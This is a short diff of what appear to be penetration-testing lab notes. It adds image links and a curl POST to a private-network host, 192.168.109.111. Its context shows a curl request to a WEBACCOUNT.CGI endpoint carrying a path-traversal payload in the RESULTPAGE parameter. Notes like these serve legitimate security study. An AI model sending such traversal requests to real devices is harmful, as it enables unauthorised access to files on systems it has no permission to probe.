@@ -1,3 +1,8 @@
+
+
+![[Pasted image 20261003194919.png]]
+
+![[Pasted image 20261003195129.png]]
 ```
 
 
@@ -119,8 +124,18 @@ curl "http://192.168.109.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..
 
 
 
+
+
+curl -isk -H "Content-Type: application/octet-stream" \
+-X "POST" \
+-b "<?xml version="1.0"?>" \
+"https://192.168.109.111"
 ```
 
 
 
+
+
+
+![[Pasted image 20261003193413.png]]
 
